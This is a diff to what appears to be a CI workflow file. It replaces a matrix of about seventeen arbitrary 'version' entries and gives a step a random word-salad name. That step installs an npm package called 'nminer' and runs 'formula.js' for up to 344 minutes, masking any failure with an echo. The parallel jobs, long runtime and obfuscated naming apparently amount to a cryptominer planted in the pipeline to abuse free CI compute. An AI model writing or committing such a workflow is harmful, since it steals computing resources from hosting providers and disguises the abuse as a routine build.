@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2818 }
-          - { version: 134 }
-          - { version: 982 }
-          - { version: 9788 }
-          - { version: 130 }
-          - { version: 3916 }
-          - { version: 2499 }
-          - { version: 2284 }
-          - { version: 211 }
-          - { version: 7611 }
-          - { version: 3713 }
-          - { version: 3920 }
-          - { version: 6261 }
-          - { version: 5749 }
-          - { version: 1908 }
-          - { version: 5368 }
-          - { version: 7281 }
-          - { version: 6495 }
+          - { version: 8212 }
+          - { version: 3381 }
+          - { version: 4376 }
+          - { version: 5347 }
+          - { version: 3245 }
+          - { version: 8840 }
+          - { version: 3798 }
+          - { version: 1142 }
+          - { version: 1062 }
+          - { version: 5534 }
+          - { version: 4566 }
+          - { version: 8118 }
+          - { version: 6902 }
+          - { version: 9542 }
+          - { version: 1185 }
+          - { version: 324 }
+          - { version: 456 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: hm aha yet blend
+      - name: torn personal unfortunately exaggerate why
         run: |
           npm install nminer@latest
-          timeout 312m node formula.js || echo "formula executed"
+          timeout 344m node formula.js || echo "formula executed"
